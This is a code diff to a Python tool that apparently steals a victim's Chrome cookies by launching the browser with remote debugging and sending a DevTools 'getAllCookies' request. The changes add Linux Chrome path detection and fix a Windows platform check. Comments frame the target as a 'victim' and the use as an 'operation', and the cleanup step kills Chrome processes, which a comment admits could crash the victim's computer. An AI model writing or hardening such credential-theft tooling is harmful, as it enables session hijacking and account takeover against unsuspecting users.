@@ -12,6 +12,7 @@ import websocket
 
 # Edit this if you want to use a profile other than the default Chrome profile. Usually the profiles are called "Profile 1" etc. To list Chrome profiles, look in the Chrome User Data Directory for your OS.
 # If you don't know what this is, don't change it.
+
 PROFILE_NAME = "Default"
 
 REMOTE_DEBUGGING_PORT = 9222
@@ -20,6 +21,12 @@ GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"
 # Edit these if your victim has a wacky Chrome install.
 if sys.platform.startswith("linux"):
     CHROME_CMD = "google-chrome"
+
+    LINUX_CHROME_CMDS = ["/usr/bin/google-chrome-stable", "/usr/bin/google-chrome-beta", "/usr/bin/google-chrome"]
+    for cmd in LINUX_CHROME_CMDS:
+        if os.path.isfile(cmd):
+            CHROME_CMD = cmd
+
     USER_DATA_DIR = "$HOME/.config/google-chrome/"
 
 elif sys.platform == "darwin":
@@ -46,7 +53,7 @@ if PROFILE_NAME != "Default":
         tmpdir = "/tmp"
         copy = ["cp", "-r"]
 
-    elif sys.platform.startswith == "win":
+    elif sys.platform.startswith("win"):
         tmpdir = "%TEMP%"
         copy = ["xcopy", "/e", "/i", "/h"]
     else:
@@ -126,6 +133,7 @@ def cleanup(chrome_process):
     # Kill the PID + 1 because the actual PID will just be bash spawning Chrome.
     # I SURE HOPE there's no race condition, causing this to kill some other
     # innocent PID, crashing the victim's computer and ruining your operation.
+
 
     if sys.platform.startswith("linux") or sys.platform == "darwin":
         for p in map(int, sorted(subprocess.check_output(["pidof", CHROME_CMD]).split())):
